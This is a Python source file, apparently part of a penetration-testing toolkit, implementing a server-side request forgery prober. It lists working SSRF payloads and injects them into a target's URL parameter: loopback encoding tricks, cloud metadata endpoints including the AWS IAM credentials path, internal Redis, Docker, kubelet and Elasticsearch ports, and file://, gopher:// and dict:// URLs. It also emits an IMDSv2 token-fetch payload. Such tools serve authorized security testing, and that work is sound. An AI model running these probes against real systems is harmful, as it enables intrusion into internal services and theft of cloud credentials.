#!/usr/bin/env python3
"""
redshift_toolkit.web.ssrf_prober — server-side request forgery probe.

Tries each SSRF payload in `--param` and reports which trigger a behavioral
change indicating the server made the request.

Detection signals
-----------------
- HTTP status differs from baseline (200 vs 403/500)
- Response length differs significantly
- Response contains markers expected from internal services:
    * "EC2", "ami-id", "instance-id" (AWS metadata)
    * "computeMetadata", "Google" (GCP metadata)
    * "Microsoft Azure" (Azure metadata)
    * "Redis", "PONG" (Redis on 6379)
    * "Elasticsearch" (port 9200)
    * "<title>Prometheus" (port 9090)

Payload categories
------------------
- Loopback (127.0.0.1, 0.0.0.0, [::])
- Loopback variants (127.1, 0177.0.0.1, 0x7f000001, 2130706433)
- Cloud metadata (AWS IMDSv1/v2, GCP, Azure with required headers)
- Common internal ports (Redis 6379, Elasticsearch 9200, etc.)
- DNS rebind targets (placeholder; operator-supplied)
- IP-in-URL tricks (userinfo, [::])

Usage
-----
  python3 -m redshift_toolkit.web.ssrf_prober --url https://app.example.com/api/fetch \\
      --param url
  python3 -m redshift_toolkit.web.ssrf_prober --url https://app.example.com/api/fetch \\
      --param url --aws-imds-v2 --json

Author: Redshift Project — Module 14
License: MIT
"""

from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


# (category, payload, marker_in_response_body or None, optional_extra_header)
PAYLOADS: list[tuple[str, str, list[str], list[tuple[str, str]] | None]] = [
    ("loopback", "http://127.0.0.1/", [], None),
    ("loopback-short", "http://127.1/", [], None),
    ("loopback-padded", "http://127.000.000.001/", [], None),
    ("loopback-hex", "http://0x7f000001/", [], None),
    ("loopback-decimal", "http://2130706433/", [], None),
    ("loopback-ipv6", "http://[::1]/", [], None),
    ("loopback-zero", "http://0.0.0.0/", [], None),
    ("loopback-userinfo", "http://example.com@127.0.0.1/", [], None),
    ("aws-imds-v1", "http://169.254.169.254/latest/meta-data/",
        ["ami-id", "instance-id", "instance-type", "iam"], None),
    ("aws-imds-v1-iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ["AccessKeyId", "SecretAccessKey", "Token"], None),
    ("gcp-metadata", "http://metadata.google.internal/computeMetadata/v1/",
        ["computeMetadata", "Google"], [("Metadata-Flavor", "Google")]),
    ("gcp-metadata-alt", "http://169.254.169.254/computeMetadata/v1/",
        ["computeMetadata", "Google"], [("Metadata-Flavor", "Google")]),
    ("azure-metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ["Azure", "compute"], [("Metadata", "true")]),
    ("redis", "http://127.0.0.1:6379/", ["+PONG", "-NOAUTH", "Redis"], None),
    ("elasticsearch", "http://127.0.0.1:9200/", ["elasticsearch", "cluster_name"], None),
    ("prometheus", "http://127.0.0.1:9090/", ["Prometheus", "<title>Prometheus"], None),
    ("kibana", "http://127.0.0.1:5601/", ["Kibana"], None),
    ("kubelet", "http://127.0.0.1:10250/pods", ["pods", "Pod"], None),
    ("docker", "http://127.0.0.1:2375/version", ["ApiVersion", "Docker"], None),
    ("file-passwd", "file:///etc/passwd", ["root:x:", "/bin/bash"], None),
    ("file-win", "file:///c:/windows/win.ini", ["[fonts]", "[mci extensions]"], None),
    ("gopher", "gopher://127.0.0.1:6379/_PING", ["+PONG", "-NOAUTH"], None),
    ("dict", "dict://127.0.0.1:11211/stats", ["STAT pid", "STAT version"], None),
]


@dataclass
class SsrfFinding:
    category: str
    payload: str
    status: int
    body_len: int
    indicator: str | None = None
    notes: str = ""


def _replace_param(url: str, body: str | None, name: str, value: str) -> tuple[str, str | None]:
    if body is None:
        sp = urlsplit(url)
        qs = parse_qsl(sp.query, keep_blank_values=True)
        new = []
        seen = False
        for k, v in qs:
            if k == name and not seen:
                new.append((k, value))
                seen = True
            else:
                new.append((k, v))
        if not seen:
            new.append((name, value))
        return urlunsplit((sp.scheme, sp.netloc, sp.path,
                           urlencode(new, safe=":/?@%[]"),
                           sp.fragment)), None
    parts = parse_qsl(body, keep_blank_values=True)
    new = []
    seen = False
    for k, v in parts:
        if k == name and not seen:
            new.append((k, value))
            seen = True
        else:
            new.append((k, v))
    if not seen:
        new.append((name, value))
    return url, urlencode(new)


def get_imds_v2_token(target_host: str, *, send_via_url: str | None = None,
                      tls_verify: bool = True, timeout: float = 5.0) -> str | None:
    """Try to retrieve an IMDSv2 token via SSRF. Operator-driven; we just
    return a payload that requests one when the SSRF supports POST/PUT.
    """
    # The SSRF endpoint typically does GET — IMDSv2 token retrieval needs PUT.
    # Returning the payload string for the operator to use manually.
    return ("PUT http://169.254.169.254/latest/api/token\n"
            "X-aws-ec2-metadata-token-ttl-seconds: 21600")


def probe(url: str, param: str, *, body: str | None = None,
          method: str = "GET",
          extra_headers: list[tuple[str, str]] | None = None,
          tls_verify: bool = True, timeout: float = 15.0,
          baseline_value: str = "https://example.com/") -> tuple[SsrfFinding, list[SsrfFinding]]:
    """Run all SSRF probes. Returns (baseline, list_of_findings)."""
    extra_headers = list(extra_headers or [])

    # Baseline
    base_url, base_body = _replace_param(url, body, param, baseline_value)
    h = list(extra_headers)
    if base_body and not any(k.lower() == "content-type" for k, _ in h):
        h.append(("Content-Type", "application/x-www-form-urlencoded"))
    r = send(HttpRequest(method=method, url=base_url, headers=h, body=base_body),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    baseline = SsrfFinding(category="baseline", payload=baseline_value,
                           status=r.status, body_len=len(r.body),
                           notes="benchmark for diff comparison")

    findings = []
    for cat, payload, markers, hdrs in PAYLOADS:
        new_url, new_body = _replace_param(url, body, param, payload)
        h2 = list(extra_headers) + (hdrs or [])
        if new_body and not any(k.lower() == "content-type" for k, _ in h2):
            h2.append(("Content-Type", "application/x-www-form-urlencoded"))
        try:
            rr = send(HttpRequest(method=method, url=new_url, headers=h2, body=new_body),
                      timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
        except Exception as e:
            findings.append(SsrfFinding(category=cat, payload=payload,
                                        status=0, body_len=0,
                                        notes=f"request failed: {e}"))
            continue
        rb = rr.body.decode("latin-1", errors="replace")
        indicator = next((m for m in markers if m in rb), None)
        diff_len = abs(len(rr.body) - baseline.body_len)
        notes = ""
        if indicator:
            notes = f"marker hit: {indicator!r}"
        elif rr.status != baseline.status:
            notes = f"status differs ({baseline.status} → {rr.status})"
        elif diff_len > max(200, baseline.body_len * 0.3):
            notes = f"body length differs by {diff_len} bytes"
        findings.append(SsrfFinding(category=cat, payload=payload,
                                    status=rr.status, body_len=len(rr.body),
                                    indicator=indicator, notes=notes))
    return baseline, findings


def render_text(baseline: SsrfFinding, findings: list[SsrfFinding],
                color: bool) -> str:
    out = [paint("\n=== SSRF probe results ===", BOLD, color)]
    out.append(f"  baseline: status={baseline.status} len={baseline.body_len}")
    vuln = 0
    for f in findings:
        if f.indicator:
            tag = paint("[HIT ]", RED, color)
            vuln += 1
        elif f.notes and "differs" in f.notes:
            tag = paint("[diff]", YELLOW, color)
        else:
            tag = paint("[----]", GREEN, color)
        out.append(f"  {tag} {f.category:<22} status={f.status} len={f.body_len}  "
                   f"{f.payload}")
        if f.notes:
            out.append(f"          {f.notes}")
    out.append("")
    out.append(paint(f"[{vuln} marker hit(s)]", BOLD, color))
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="SSRF prober.")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", required=True, help="parameter name carrying URL")
    ap.add_argument("--data", help="POST body, x-www-form-urlencoded")
    ap.add_argument("-X", "--method", default=None)
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--baseline-value", default="https://example.com/")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--aws-imds-v2", action="store_true",
                    help="emit IMDSv2 token-fetch payload to stderr for manual use")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    method = args.method or ("POST" if args.data else "GET")
    headers = []
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    if args.aws_imds_v2:
        print(paint("[*] IMDSv2 token-fetch payload (use manually if SSRF allows PUT):",
                    YELLOW, color), file=sys.stderr)
        print(get_imds_v2_token(""), file=sys.stderr)

    baseline, findings = probe(args.url, args.param, body=args.data,
                                method=method, extra_headers=headers,
                                tls_verify=not args.insecure,
                                timeout=args.timeout,
                                baseline_value=args.baseline_value)

    if args.json:
        print(json.dumps({
            "baseline": asdict(baseline),
            "findings": [asdict(f) for f in findings],
        }, indent=2))
    else:
        print(render_text(baseline, findings, color))

    has_hit = any(f.indicator for f in findings)
    return 0 if not has_hit else 1


if __name__ == "__main__":
    sys.exit(main())
